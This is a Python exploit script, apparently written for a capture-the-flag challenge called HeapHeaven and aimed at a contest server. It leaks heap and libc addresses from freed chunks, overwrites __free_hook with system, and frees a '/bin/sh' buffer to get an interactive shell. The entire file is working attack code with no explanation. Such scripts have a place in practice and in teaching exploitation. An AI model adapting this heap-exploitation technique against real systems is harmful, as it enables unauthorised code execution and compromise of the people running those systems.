#!/usr/bin/env python
from sc_expwn import *

bin_file = './HeapHeaven'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':True}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'flatearth.fluxfingers.net', 'port':1743})
env.select()

#==========

binf = ELF(bin_file)

libc = binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn):
    hh = HeapHeaven(conn)

    hh.malloc(0)
    hh.malloc(0x80)
    hh.malloc(0)

    hh.free(0x20)
    hh.free(0)
    hh.free(0x40)

    addr_heap_base      = u(hh.read(0)) - 0x20
    info('addr_heap_base = 0x%08x' % addr_heap_base)

    addr_libc_mainarena = u(hh.read(0x40)) - 0x58
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base = 0x%08x' % libc.address)

    addr_libc_free_hook     = libc.symbols['__free_hook']
    addr_libc_system        = libc.sep_function['system']

    hh.write(addr_libc_free_hook - (addr_heap_base + 0x10), p64(addr_libc_system))

    hh.write(0, '/bin/sh\x00')
    hh.free(0)

class HeapHeaven:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter
    
    def make_num(self, num):
        if num < 0:
            num += 0x10000000000000000

        s = bin(num)[2:]
        return s.replace('1', 'wi').replace('0', 'wa').ljust(0x80, '\x00')

    def malloc(self, size):
        self.sendafter('NOM-NOM\n', 'whaa!')
        self.sendlineafter('...\n', self.make_num(size))

    def read(self, offset):
        self.sendlineafter('NOM-NOM\n', 'mommy?')
        self.sendline(self.make_num(offset))
        self.recvuntil(': ')
        return self.recvuntil('\n', drop=True)

    def write(self, offset, data):
        self.sendafter('NOM-NOM\n', '<spill>')
        self.sendlineafter('doing?\n', self.make_num(offset))
        self.sendlineafter('darling!\n', data)

    def free(self, offset):
        self.sendafter('NOM-NOM\n', 'NOM-NOM')
        self.sendline(self.make_num(offset))

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
